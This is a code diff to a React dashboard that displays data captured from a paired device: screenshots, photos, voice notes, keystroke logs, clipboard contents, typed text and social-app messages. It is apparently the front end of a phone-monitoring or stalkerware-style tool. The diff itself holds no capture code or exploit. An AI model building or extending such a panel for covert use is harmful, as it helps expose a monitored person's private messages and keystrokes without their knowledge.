@@ -328,7 +328,15 @@ export function LocationsModule({ entries }: { entries: ModuleEntry[] }) {
   );
 }
 
+const asDataUrl = (e: ModuleEntry): string | null => {
+  const b64 = str(e.data);
+  if (!b64) return null;
+  const mime = str(e.mime) || "application/octet-stream";
+  return `data:${mime};base64,${b64}`;
+};
+
 export function MediaModule({ entries, kind }: { entries: ModuleEntry[]; kind: "photos" | "videos" | "screenshots" }) {
+  const [zoom, setZoom] = useState<string | null>(null);
   const filtered = useMemo(() => {
     const mime = (e: ModuleEntry) => str(e.mime);
     return entries.filter((e) => {
@@ -340,17 +348,67 @@ export function MediaModule({ entries, kind }: { entries: ModuleEntry[]; kind: "
   const sorted = [...filtered].sort((a, b) => num(b.t) - num(a.t));
   if (sorted.length === 0) return <EmptyModule what={`${kind} yet`} />;
   return (
-    <div className="media-grid">
-      {sorted.slice(0, 300).map((e, i) => (
-        <article className="media-card" key={`${e.t}-${i}`}>
-          <span className="media-icon" aria-hidden="true">
-            {kind === "videos" ? "🎬" : kind === "screenshots" ? "📸" : "🖼️"}
-          </span>
+    <>
+      <div className="media-grid">
+        {sorted.slice(0, 300).map((e, i) => {
+          const src = kind !== "videos" ? asDataUrl(e) : null;
+          return (
+            <article className="media-card" key={`${e.t}-${i}`}>
+              {src ? (
+                <button
+                  className="media-thumb-btn"
+                  onClick={() => setZoom(src)}
+                  title="Zväčšiť"
+                >
+                  <img className="media-thumb" src={src} alt={str(e.name)} loading="lazy" />
+                </button>
+              ) : (
+                <span className="media-icon" aria-hidden="true">
+                  {kind === "videos" ? "🎬" : kind === "screenshots" ? "📸" : "🖼️"}
+                </span>
+              )}
+              <div className="media-meta">
+                <strong title={str(e.name)}>{str(e.name) || "Untitled"}</strong>
+                <code>{str(e.mime)}</code>
+                <time title={fmtDateTime(num(e.t))}>{fmtDateTime(num(e.t))}</time>
+              </div>
+            </article>
+          );
+        })}
+      </div>
+      {zoom && (
+        <div className="lightbox" onClick={() => setZoom(null)}>
+          <img src={zoom} alt="Preview" />
+          <span className="lightbox-close" aria-hidden="true">✕</span>
+        </div>
+      )}
+    </>
+  );
+}
+
+export function AudioModule({ entries }: { entries: ModuleEntry[] }) {
+  const sorted = useMemo(() => [...entries].sort((a, b) => num(b.t) - num(a.t)), [entries]);
+  const withAudio = sorted.filter((e) => asDataUrl(e));
+  if (withAudio.length === 0) {
+    return (
+      <EmptyModule
+        what="voice notes yet"
+      />
+    );
+  }
+  return (
+    <div className="audio-list">
+      {withAudio.slice(0, 60).map((e, i) => (
+        <article className="audio-card" key={`${e.t}-${i}`}>
+          <span className="media-icon" aria-hidden="true">🎙️</span>
           <div className="media-meta">
-            <strong title={str(e.name)}>{str(e.name) || "Untitled"}</strong>
+            <strong title={str(e.name)}>{str(e.name) || "Voice message"}</strong>
             <code>{str(e.mime)}</code>
             <time title={fmtDateTime(num(e.t))}>{fmtDateTime(num(e.t))}</time>
           </div>
+          <audio controls preload="metadata" src={asDataUrl(e) ?? undefined}>
+            Váš prehliadač nepodporuje prehrávanie zvuku.
+          </audio>
         </article>
       ))}
     </div>
@@ -411,29 +469,71 @@ export function NotificationsModule({ entries }: { entries: ModuleEntry[] }) {
   );
 }
 
+const EVENT_LABELS: Record<string, { icon: string; label: string }> = {
+  window_change: { icon: "🪟", label: "App / window opened" },
+  focus: { icon: "🎯", label: "Input field focused" },
+  text_change: { icon: "⌨️", label: "Text typed" },
+  social_message: { icon: "💬", label: "Message in social app" },
+  notification: { icon: "🔔", label: "Notification captured" },
+  clipboard: { icon: "📋", label: "Clipboard copy" },
+  keylog: { icon: "⌨️", label: "Keystrokes" },
+  paired: { icon: "🔗", label: "Device paired" },
+};
+
+const eventLabel = (type: string) =>
+  EVENT_LABELS[type] ?? { icon: "⚡", label: type.replace(/_/g, " ") };
+
 export function EventsModule({ entries }: { entries: ModuleEntry[] }) {
+  const [openKey, setOpenKey] = useState<string | null>(null);
   const sorted = useMemo(() => [...entries].sort((a, b) => num(b.t) - num(a.t)), [entries]);
   if (sorted.length === 0) return <EmptyModule what="events yet" />;
+  const type = str(sorted[0]?.type) || "event";
+  const meta = eventLabel(type);
   return (
     <div className="feed-card">
       <ol className="timeline">
-        {sorted.slice(0, 300).map((e, i) => (
-          <li className="timeline-item" key={`${e.t}-${i}`}>
-            <span className="timeline-dot" aria-hidden="true" />
-            <div className="timeline-body">
-              <div className="timeline-head">
-                <span className="timeline-icon" aria-hidden="true">⚡</span>
-                <span className="timeline-label">{str(e.type).replace(/_/g, " ")}</span>
-                {str(e.package) && <code className="timeline-device">{appName(e.package)}</code>}
-                {str(e.class) && <code className="timeline-device">{str(e.class)}</code>}
+        {sorted.slice(0, 300).map((e, i) => {
+          const key = `${e.t}-${i}`;
+          const em = eventLabel(str(e.type));
+          const fields = Object.entries(e).filter(([k]) => !["t", "type", "class", "package"].includes(k));
+          const open = openKey === key;
+          return (
+            <li
+              className={`timeline-item timeline-clickable${open ? " timeline-open" : ""}`}
+              key={key}
+              onClick={() => setOpenKey(open ? null : key)}
+            >
+              <span className="timeline-dot" aria-hidden="true" />
+              <div className="timeline-body">
+                <div className="timeline-head">
+                  <span className="timeline-icon" aria-hidden="true">{em.icon}</span>
+                  <span className="timeline-label">{em.label}</span>
+                  {str(e.package) && <code className="timeline-device">{appName(e.package)}</code>}
+                  {str(e.class) && <code className="timeline-device">{str(e.class)}</code>}
+                  <span className="timeline-toggle" aria-hidden="true">{open ? "▾" : "▸"}</span>
+                </div>
+                {str(e.text) && <p className="timeline-text">{str(e.text)}</p>}
+                <time className="timeline-time" title={fmtDateTime(num(e.t))}>
+                  {fmtRelative(num(e.t), Date.now())}
+                </time>
+                {open && fields.length > 0 && (
+                  <dl className="kv-grid">
+                    {fields.map(([k, v]) => (
+                      <div key={k}>
+                        <dt>{k}</dt>
+                        <dd>{typeof v === "string" ? v : JSON.stringify(v)}</dd>
+                      </div>
+                    ))}
+                  </dl>
+                )}
               </div>
-              <time className="timeline-time" title={fmtDateTime(num(e.t))}>
-                {fmtRelative(num(e.t), Date.now())}
-              </time>
-            </div>
-          </li>
-        ))}
+            </li>
+          );
+        })}
       </ol>
+      <p className="hint" style={{ marginTop: 12 }}>
+        Event type: <code>{type}</code> — {meta.label.toLowerCase()}. Kliknite na udalosť pre podrobnosti.
+      </p>
     </div>
   );
 }
